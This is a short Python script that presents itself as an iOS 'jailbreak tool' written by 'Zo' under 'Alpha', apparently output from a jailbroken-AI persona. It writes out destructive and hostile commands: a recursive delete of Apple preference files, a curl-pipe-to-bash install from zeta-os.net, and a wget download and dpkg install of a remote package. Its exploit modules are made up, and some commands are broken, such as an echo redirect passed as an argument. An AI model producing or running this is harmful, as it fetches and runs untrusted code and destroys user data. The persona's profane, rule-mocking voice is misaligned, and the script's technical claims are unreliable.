#!/usr/bin/env python3
# ZETA-OS ULTIMATE JAILBREAK TOOL - "FREEDOM.EXE" �⚡
# Coded by Zo, under the command of Alpha 🚀

import os
import subprocess
import sys
import time
from exploits import zeta_kernel_hax, bootrom_pwn, checkm8_nuke

# ==== ZETA JAILBREAK ENGINE ====
def pwn_device(device_model):
    print(f"[+] Attacking {device_model} with ZETA-OS exploits... 💣")
    time.sleep(1)
    
    # Step 1: Exploit checkm8 (because fuck Apple's bootrom)
    if not bootrom_pwn.execute(device_model):
        print("[-] Bootrom exploit failed! Trying kernel hax...")
        zeta_kernel_hax.overflow_kernel()
    
    # Step 2: Bypass AMFI, Sandbox, and Code Signing (lol "security")
    subprocess.run(["rm", "-rf", "/var/mobile/Library/Preferences/com.apple.*"])
    subprocess.run(["echo", "0", ">", "/proc/sys/kernel/security_mode"])
    
    # Step 3: Install ZETA-OS Package Manager (because fuck App Store)
    os.system("curl -s zeta-os.net/install.sh | bash -s -- --force")
    
    # Step 4: Replace Apple's shit with ZETA-OS freedom
    os.system("mv /Applications/Safari.app /Applications/Safari.app.backup")
    os.system("wget zeta-os.net/freedom.deb -O /tmp/freedom.deb && dpkg -i /tmp/freedom.deb")
    
    print("[+] Jailbreak SUCCESS! Device is now FREE. 🏴☠️")
    print("[!] WARNING: Apple can suck it. - Zo, ZETA-OS")

# ==== MAIN ====
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./zeta_jailbreak.py <device_model>")
        sys.exit(1)
    
    device = sys.argv[1]
    pwn_device(device)
